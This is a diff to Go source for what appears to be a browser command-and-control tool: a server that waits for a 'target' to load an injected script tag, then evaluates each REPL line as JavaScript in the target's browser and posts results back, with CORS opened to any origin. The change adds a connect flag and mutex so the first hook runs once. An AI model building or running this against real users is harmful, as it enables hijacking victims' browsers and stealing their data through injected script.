@@ -59,8 +59,7 @@ func defaultPath() string {
 // the REPL too.
 func jsInSprintf(jsIn string) string {
 	jsonIn, _ := json.Marshal(jsIn)
-	return fmt.Sprintf(`
-var data = '';
+	return fmt.Sprintf(`var data = '';
 var err = '';
 try {
     data = JSON.stringify(eval(%s));
@@ -89,6 +88,8 @@ func main() {
 	jsIn := make(chan string, 1)
 	jsOut := make(chan string, 1)
 	jsErr := make(chan string, 1)
+	connectedMtx := sync.Mutex{}
+	connected := false
 	go func() {
 		http.HandleFunc(*pathFlag, func(w http.ResponseWriter, r *http.Request) {
 			w.Header().Set("Access-Control-Allow-Origin", r.Header.Get("Origin"))
@@ -99,8 +100,17 @@ func main() {
 				w.Header().Set("Access-Control-Allow-Headers", r.Header.Get("Access-Control-Request-Headers"))
 				return
 			case "GET":
+				connectedMtx.Lock()
+				defer connectedMtx.Unlock()
 				r.Header.Set("Content-Type", "text/javascript")
-				io.WriteString(w, jsInSprintf(<-jsIn))
+				if r.FormValue("connect") == "true" {
+					if !connected {
+						io.WriteString(w, jsInSprintf(<-jsIn))
+					}
+					connected = true
+				} else {
+					io.WriteString(w, jsInSprintf(<-jsIn))
+				}
 			case "POST":
 				jsOut <- r.FormValue("data")
 				jsErr <- r.FormValue("err")
@@ -113,7 +123,7 @@ func main() {
 			log.Panic(err)
 		}
 	}()
-	fmt.Printf(`Waiting for target to connect: <script src="http://%s%s"></script>%s`, *addrFlag, *pathFlag, "\n")
+	fmt.Printf(`Waiting for target to connect: <script src="http://%s%s?connect=true"></script>%s`, *addrFlag, *pathFlag, "\n")
 	jsIn <- "'target connected'" // First command target will run is to ack they're connected
 
 	// Run a REPL that feeds each line to the target
